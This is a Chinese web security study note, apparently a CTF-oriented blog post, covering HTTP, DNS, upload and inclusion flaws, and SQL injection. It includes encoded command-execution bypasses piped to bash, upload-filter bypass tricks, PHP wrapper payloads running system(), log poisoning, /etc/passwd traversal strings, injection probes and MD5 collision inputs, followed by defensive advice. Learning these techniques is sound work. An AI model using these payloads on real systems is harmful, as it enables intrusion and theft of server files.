---
title: Web安全技术综合学习笔记
tags: [Web安全, HTTP协议, DNS, Shell, 文件上传, 文件包含, SQL注入, 网络安全]
date: 2024-03-13
---

# Web安全技术综合学习笔记

本文整理了Web安全技术的核心知识点，包括HTTP协议、DNS解析、Shell命令执行、文件上传漏洞、文件包含漏洞、SQL注入等重要内容。

<!-- more -->

## 1. HTTP协议基础

### HTTP协议概述
HTTP（超文本传输协议HyperText Transfer Protocol）是基于TCP协议的应用层传输协议，定义了客户端和服务端进行数据传输的规则。

### HTTP请求组成
HTTP请求由三部分构成：
1. **请求行**：包含请求方法、URL和HTTP版本
2. **请求头**：包含各种头部信息（如Cookie、User-Agent等）
3. **请求正文**：POST请求有，GET请求没有

#### 请求行格式
```
GET /example.html HTTP/1.1 (CRLF)
```

#### 常见HTTP请求方法
| 方法 | 描述 |
|------|------|
| **GET** | 从服务器获取数据，获取网页、图片等静态资源 |
| **POST** | 向服务器提交数据，提交表单、上传文件等 |
| **PUT** | 向服务器上传新数据，更新资源 |
| **DELETE** | 从服务器删除数据，删除资源 |

#### 重要请求头字段
- **Host**：指定请求的服务器地址
- **Connection**：连接控制（keep-alive保持连接）
- **User-Agent**：浏览器或操作系统属性
- **Referer**：表示页面来源
- **Accept**：声明接受的内容类型
- **Content-Type**：指示资源的MIME类型
- **Content-Disposition**：定义内容展示方式（inline/attachment）
- **X-Forwarded-For**：记录原始请求者IP地址

### HTTP响应

#### 响应组成
1. **状态行**：HTTP版本、状态码、状态描述
2. **响应头**：各种头部信息
3. **响应正文**：实际内容

#### HTTP状态码
| 类别 | 描述 | 常见状态码 |
|------|------|------------|
| **1xx** | 指示信息 | 100 Continue |
| **2xx** | 成功 | 200 OK |
| **3xx** | 重定向 | 302 Found, 304 Not Modified |
| **4xx** | 客户端错误 | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found |
| **5xx** | 服务器错误 | 500 Internal Server Error, 503 Service Unavailable |

#### 重要响应头字段
- **Content-Encoding**：数据压缩方法（如gzip）
- **Content-Length**：响应正文长度
- **Content-Type**：响应内容的MIME类型
- **Transfer-Encoding**：传输编码方式（如chunked分块传输）
- **Location**：重定向目标URL

### HTTP版本特性

#### HTTP/1.1特性
- **持久连接**：默认keep-alive，提高性能
- **管道机制**：同一TCP连接可发送多个请求
- **缺点**：队头阻塞问题

#### HTTP/2特性
- **多路复用**：避免队头阻塞
- **数据流管理**：可取消特定请求
- **服务器推送**：主动推送静态资源

## 2. DNS与CDN

### DNS记录类型
| 记录类型 | 描述 | 格式示例 |
|----------|------|----------|
| **A记录** | 域名映射到IPv4地址 | `domain TTL IN A IP地址` |
| **AAAA记录** | 域名映射到IPv6地址 | `domain TTL IN AAAA IPv6地址` |
| **CNAME记录** | 域名别名 | `alias TTL IN CNAME target` |
| **MX记录** | 邮件服务器 | `domain TTL IN MX priority mailserver` |
| **TXT记录** | 文本信息 | `domain TTL IN TXT "text"` |
| **PTR记录** | 反向DNS查找 | `IP TTL IN PTR domain` |

### CNAME记录的意义
- **主域名管理**：多个子域名指向同一主域名
- **IP变更便利**：只需修改主域名的A记录
- **示例**：
  ```
  www.yy.com → www.xx.com → 1.1.1.1
  www.cc.com → www.xx.com → 1.1.1.1
  ```

### CDN（内容分发网络）
- **作用**：将内容缓存在多个网络节点，用户就近访问
- **优势**：提高访问速度，支持多线路，减少跨网访问
- **工作原理**：通过DNS解析将用户请求导向最近的CDN节点

### DNS解析流程
1. 检查本地hosts文件
2. 查询本地DNS缓存
3. 向递归DNS服务器查询
4. 递归查询：根服务器 → 顶级域名服务器 → 权威域名服务器
5. 返回解析结果

### 重要概念
- **权威域名服务器**：负责特定域名的官方DNS服务器
- **递归DNS服务器**：代理用户进行DNS查询的服务器
- **域传送**：主备DNS服务器之间的数据同步机制
- **hosts文件**：本地域名-IP映射文件，优先级高于DNS

## 3. Shell命令执行

### Shell类型
| Shell类型 | 描述 |
|-----------|------|
| **bash** | Linux标准默认shell，功能强大 |
| **sh** | Unix标准默认shell，早期流行 |
| **ash** | 轻量级shell，资源占用少 |

### 常见Linux命令
| 命令 | 功能 | 示例 |
|------|------|------|
| `ls` | 列出目录内容 | `ls -la` |
| `cd` | 切换目录 | `cd /home` |
| `echo` | 输出文本 | `echo "Hello"` |
| `cat` | 查看文件内容 | `cat flag.php` |
| `tac` | 反向查看文件 | `tac flag.php` |

### 命令执行绕过技巧

#### Base64编码绕过
```bash
echo "Y2F0IGZsYWcucGhw" | base64 -d | bash
# 解码后执行: cat flag.php
```

#### 变量分割绕过
```bash
echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh
```

#### 八进制编码绕过
```bash
eval "\163\171\163\164\145\155"("\144\151\162")
# 相当于: system("dir")
```

#### 十六进制编码绕过
```bash
echo "63617420666c61672e706870"|xxd -r -p|bash
```

#### Shellcode编码绕过
```bash
printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"
```

## 4. 文件上传漏洞

### 绕过方法分类

#### 1. 前端绕过
- 修改`accept`属性：从'images'改为'files'
- 修改`exts`属性：从'png'改为'php'

#### 2. 后缀名绕过
- **大小写绕过**：`.PHP`、`.Php`
- **双写绕过**：`.pphpHP`
- **空格绕过**：`.php `
- **点号绕过**：`.php.`（Windows特性）
- **特殊后缀**：`.php3`、`.php4`、`.php5`、`.phtml`

#### 3. MIME类型绕过
修改Content-Type：
```
Content-Type: image/png
Content-Type: image/jpeg
```

#### 4. 文件内容绕过
- **文件头绕过**：添加图片文件头
- **图片马制作**：将PHP代码嵌入图片

#### 5. 配置文件绕过

##### .user.ini绕过
```ini
auto_prepend_file=shell.jpg
```
- 适用于PHP环境
- 自动包含指定文件
- 无需重启服务器

##### .htaccess绕过
```apache
AddType application/x-httpd-php .jpg
```
- 适用于Apache环境
- 将图片文件当作PHP执行

#### 6. 特殊字符绕过

##### %00截断绕过
```
filename="shell.php%00.jpg"
```
- 需要`magic_quotes_gpc=off`
- 利用NULL字节截断

##### Windows特性绕过
```
filename="shell.php::$DATA"
```
- 利用NTFS文件流特性
- 保持原文件名

### 文件上传安全防护
1. **白名单验证**：只允许特定后缀
2. **文件内容检测**：检查文件头和内容
3. **重命名文件**：随机生成文件名
4. **隔离执行**：上传目录禁止执行
5. **大小限制**：限制上传文件大小

## 5. 文件包含漏洞

### 漏洞分类

#### LFI（本地文件包含）
- 包含服务器本地文件
- 最常见的文件包含类型
- 危害相对较小

#### RFI（远程文件包含）
- 包含远程服务器文件
- 需要特定配置：
  ```php
  allow_url_fopen = On
  allow_url_include = On
  ```
- 危害性极大

### PHP伪协议利用

#### php://filter协议
```php
// Base64编码读取文件
php://filter/read=convert.base64-encode/resource=flag.php

// 读取源码
php://filter/convert.base64-encode/resource=index.php
```

#### data://协议
```php
// 执行PHP代码
data://text/plain,<?php system('cat flag.php');?>

// Base64编码执行
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

#### php://input协议
```php
// POST数据执行
php://input
// POST: <?php system('cat flag.php');?>
```

### 日志包含攻击

#### Apache日志包含
```php
// 包含访问日志
include '/var/log/httpd/access.log';
include '/var/log/apache2/access.log';
```

#### Nginx日志包含
```php
// 包含访问日志
include '/var/log/nginx/access.log';
```

#### 攻击步骤
1. 在User-Agent中插入PHP代码
2. 访问目标页面，代码写入日志
3. 包含日志文件执行代码

### 绕过技巧

#### 路径绕过
```php
// 目录遍历
../../../etc/passwd

// 编码绕过
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

// 双重编码
%252e%252e%252f
```

#### 协议绕过
```php
// 文件协议
file:///etc/passwd

// 压缩协议
zip://shell.zip#shell.php
phar://shell.phar/shell.php
```

## 6. SQL注入基础

### 注入点判断

#### 数字型注入
```sql
-- 测试方法
id=1 and 1=1  -- 返回正常
id=1 and 1=2  -- 返回异常

-- 可能的SQL语句
SELECT * FROM table WHERE id = 1 AND 1=1
```

#### 字符型注入
```sql
-- 测试方法
name=admin' and '1'='1  -- 返回正常
name=admin' and '1'='2  -- 返回异常

-- 可能的SQL语句
SELECT * FROM table WHERE name = 'admin' AND '1'='1'
```

#### 搜索型注入
```sql
-- 测试方法
keyword=test%' and 1=1 and '%'='  -- 返回正常

-- 可能的SQL语句
SELECT * FROM table WHERE keyword LIKE '%test%' AND 1=1 AND '%'='%'
```

### 注入点类型

#### 闭合方式判断
```sql
-- 整型闭合
WHERE id = 1;

-- 单引号闭合
WHERE id = '1';

-- 双引号闭合
WHERE id = "1";

-- 括号闭合
WHERE id = ('1');
WHERE id = ("1");
```

### 注入位置分类

| 注入位置 | 描述 | 示例 |
|----------|------|------|
| **GET参数** | URL参数中的注入 | `?id=1' union select 1,2,3--` |
| **POST参数** | 表单数据中的注入 | `username=admin' or 1=1--` |
| **Cookie** | Cookie值中的注入 | `Cookie: id=1' union select 1,2,3--` |
| **User-Agent** | HTTP头中的注入 | `User-Agent: ' union select 1,2,3--` |
| **Referer** | 来源页面中的注入 | `Referer: ' union select 1,2,3--` |

## 7. 安全工具与技术

### CURL工具
```bash
# 显示连接信息
curl -v http://example.com

# 指定请求方法
curl -X POST http://example.com

# 发送数据
curl -d "data=value" http://example.com

# 设置请求头
curl -H "Content-Type: application/json" http://example.com
```

### Burp Suite爆破
1. **发送到Intruder**：将请求发送到爆破模块
2. **选择攻击类型**：Sniper、Battering ram、Pitchfork、Cluster bomb
3. **设置字典**：加载用户名和密码字典
4. **配置选项**：设置线程、延时等参数
5. **开始攻击**：执行爆破并分析结果

### MD5绕过技巧

#### 0e绕过（弱比较）
```php
// 这些字符串的MD5值都以0e开头
QNKCDZO     => 0e830400451993494058024219903391
240610708   => 0e462097431906509019562988736854
s878926199a => 0e545993274517709034328855841020
```

#### 数组绕过
```php
// MD5无法处理数组，返回NULL
md5(array()) == md5(array())  // true
```

#### 强类型绕过
```php
// 使用MD5碰撞
$a = "M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2";
$b = "M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2";
// md5($a) === md5($b) 但 $a !== $b
```

## 8. 高级攻击技术

### CRLF注入
- **原理**：注入回车换行符（\r\n）
- **影响**：HTTP响应分割攻击
- **利用**：注入恶意HTTP头或HTML代码

### 伪随机数爆破
- **原理**：随机数基于种子生成，具有线性关系
- **工具**：php_mt_seed等专用工具
- **应用**：破解基于时间戳的随机数

### DDoS与CC攻击
- **DDoS**：分布式拒绝服务，针对网络层
- **CC攻击**：针对应用层，发送大量合法请求耗尽资源

## 9. 防护建议

### 输入验证
1. **白名单验证**：只允许预期的输入
2. **长度限制**：限制输入数据长度
3. **类型检查**：验证数据类型
4. **编码处理**：正确处理特殊字符

### 输出编码
1. **HTML编码**：防止XSS攻击
2. **SQL转义**：防止SQL注入
3. **URL编码**：处理URL参数

### 访问控制
1. **最小权限原则**：给予最小必要权限
2. **身份认证**：强化用户认证机制
3. **会话管理**：安全的会话处理

### 系统加固
1. **及时更新**：保持系统和软件最新
2. **安全配置**：正确配置服务器和应用
3. **监控日志**：实时监控异常行为
4. **备份恢复**：定期备份重要数据

## 总结

Web安全是一个复杂的领域，涉及多个层面的技术和知识。从HTTP协议基础到各种攻击技术，每个环节都需要深入理解。作为安全从业者，需要：

1. **扎实的基础知识**：深入理解网络协议和Web技术
2. **实践经验**：通过实际操作掌握攻防技巧
3. **持续学习**：跟上安全技术的发展趋势
4. **防护意识**：始终以防护为目标，而非单纯的攻击

安全是一个持续的过程，需要在攻防对抗中不断提升技能和认知水平。